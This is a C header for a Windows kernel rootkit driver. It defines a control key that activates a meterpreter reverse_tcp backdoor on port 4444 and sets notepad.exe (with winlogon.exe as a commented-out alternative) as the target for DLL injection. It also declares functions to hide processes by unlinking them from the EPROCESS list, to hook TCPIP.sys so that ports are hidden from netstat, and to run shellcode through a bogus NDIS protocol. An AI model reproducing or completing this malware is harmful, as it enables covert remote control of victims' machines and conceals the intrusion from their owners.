#pragma once
#pragma warning(disable: 4201)



#include <stdio.h>
#include <stdlib.h>
#include <ntddk.h>
#include <winapifamily.h> 
#include <ntimage.h>
#include <stdarg.h>


/*
* Magic sequence that activates meterpreter/reverse_tcp backdoor on port 4444.
* Use rootkit_ping.py script for communicating with the infected target.
*/
#define ROOTKIT_CTL_KEY "7C5E3380"


/**
* Process to inject meterpreter DLL.
*/
//#define METERPRETER_PROCESS L"winlogon.exe"
#define METERPRETER_PROCESS L"notepad.exe"


// NDIS version: 5.1
// Microsoft required pre-processor definition
#define NDIS51 1
#include "ndis.h"

// IoControl Code we want to filter in TCPIP.sys
// When a program such as netstat.exe requests a list of ports/programs
// it uses the major IRP control code IOCTL_TCP_QUERY_INFORMATION_EX
#define IOCTL_TCP_QUERY_INFORMATION_EX 0x00120003


DRIVER_INITIALIZE DriverEntry;

//------------------------------------------------------------------------------
//						Main Driver Functionality (driver.c)
//------------------------------------------------------------------------------

// Driver unload function
VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject);

//------------------------------------------------------------------------------
//						IRP Handlers (irphandlers.c)
//------------------------------------------------------------------------------

// Default IRP dispatcher
NTSTATUS defaultIrpHandler(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);

// IRP that calls our rootkit functionality
NTSTATUS IrpCallRootkit(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);

//------------------------------------------------------------------------------
//						DKOM Functionality (hideprocess.c)
//------------------------------------------------------------------------------

// Search for the process to modify
PCHAR modifyTaskList(UINT32 pid);


// De-link the process from the EPROCESS list
void remove_links(PLIST_ENTRY Current);

//------------------------------------------------------------------------------
//						Offset Discovery (discoveroffset.c)
//------------------------------------------------------------------------------

// Return the offset of the PID field in the EPROCESS list
ULONG find_eprocess_pid_offset();

//------------------------------------------------------------------------------
//								TCP/IP Hook
/*------------------------------------------------------------------------------

// Hook the TCPIP.sys driver
NTSTATUS TCPHook();


// Hook handler for hooked TCP/IP driver
NTSTATUS TCPIRPHookHandler(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);


// Completion routine
NTSTATUS HookCompletionRoutine(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp, _In_ PVOID Context);

// Removal function, for driver unload
NTSTATUS RemoveTCPHook(_In_ PDRIVER_OBJECT DriverObject); */




//------------------------------------------------------------------------------
//								NDIS Protocol
//------------------------------------------------------------------------------
/*
NTSTATUS BogusProtocolRegister();
void BogusProtocolUnregister();

void RunShellcode(PVOID param); */
